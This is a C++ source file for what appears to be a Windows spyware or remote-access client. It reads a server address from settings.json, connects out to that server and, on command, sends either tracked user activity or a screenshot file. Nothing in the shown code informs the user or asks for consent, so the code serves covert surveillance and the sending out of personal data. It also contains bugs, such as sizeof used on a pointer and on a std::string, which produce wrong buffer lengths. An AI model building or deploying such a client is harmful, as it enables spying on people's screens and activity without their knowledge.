#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "connect.h"
#include "function.h"
#include <fstream>
#include <string>
#include <cstdio> 
#include <cstring> 
#include <nlohmann/json.hpp>

#pragma comment(lib, "WS2_32.lib")

int64_t get_file_size(const std::string& filename) {
	FILE* file;
	if (fopen_s(&file, filename.c_str(), "rb") != 0) {
		return -1;
	}
	_fseeki64(file, 0, SEEK_END);
	const int64_t size = _ftelli64(file);
	fclose(file);
	return size;
}

int Connect::send_buffer(SOCKET server, const char* buffer, int buffer_size) {
	int chunk_size = 4 * 1024;
	unsigned int i = 0;

	while (i < buffer_size) {
		const int temp_value = send(server, &buffer[i], __min(chunk_size, buffer_size - i), 0);
		i += temp_value;
	}
	return i;
}

void Connect::send_file(SOCKET server, const std::string& file_name) {
	int chunk_size = 64 * 1024;
	const int64_t file_size = get_file_size(file_name);

	std::ifstream file(file_name, std::ifstream::binary);

	if (send_buffer(server, reinterpret_cast<const char*>(&file_size),
		sizeof(file_size)) != sizeof(file_size)) {
	}

	auto buffer_temp = std::make_unique<char[]>(chunk_size);
	char* buffer = buffer_temp.get();

	int64_t i = file_size;
	while (i != 0) {
		const int64_t send_size = __min(i, (int64_t)chunk_size);
		file.read(buffer, send_size);
		const int l = send_buffer(server, buffer, (int)send_size);
		i -= l;
	}

	file.close();
}

void Connect::install_settings() {
	nlohmann::json json_data;

	std::ifstream file("settings.json");
	if (!file.is_open()) {
		exit(-1);
	}
	else {
		file >> json_data;
		file.close();
	}

	auto ip_address_temp = json_data.find("ip_address");
	ip_address = *ip_address_temp;

	auto port_temp = json_data.find("port");
	port = *port_temp;
}

DWORD WINAPI receive_data(LPVOID data) {
	SOCKET server = *(SOCKET*)data;

	auto buffer_temp = std::make_unique<char[]>(1024);
	char* buffer = buffer_temp.get();
	unsigned int option;

	Connect connect;
	while (true) {
		if (recv(server, buffer, sizeof(buffer), 0) == SOCKET_ERROR) {
			connect.establish_connection();
		}

		Function function;
		option = atoi(buffer);

		if (1 == option) {
			std::string time_us_activity = function.follow_activity();
			std::cout << time_us_activity;
			connect.send_buffer(server, time_us_activity.data(), sizeof(time_us_activity));

			memset(buffer, 0, sizeof(buffer));
		}

		else if (2 == option) {
			function.get_screenshot();
			connect.send_file(server, "screen.png");
		}

		memset(buffer, 0, sizeof(buffer));
		connect.establish_connection();
	}
	return 1;
}


void Connect::establish_connection() {
	install_settings();

	WSADATA WSAData;
	SOCKET server;
	SOCKADDR_IN socket_address;
	WSAStartup(MAKEWORD(2, 0), &WSAData);
	if ((server = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		std::cout << "Server is not ready!";
		establish_connection();
	}

	const char* ip_addr = ip_address.c_str();

	socket_address.sin_addr.s_addr = inet_addr(ip_addr);
	socket_address.sin_family = AF_INET;
	socket_address.sin_port = htons(port);

	if (connect(server, (SOCKADDR*)&socket_address, sizeof(socket_address)) == SOCKET_ERROR) {
		establish_connection();
	}

	DWORD process_id;


	HANDLE handler_receive = CreateThread(NULL, 0, receive_data, &server, 0, &process_id);
	if (handler_receive == NULL) {
		establish_connection();
	}

	WaitForSingleObject(handler_receive, INFINITE);
	closesocket(server);
	WSACleanup();
}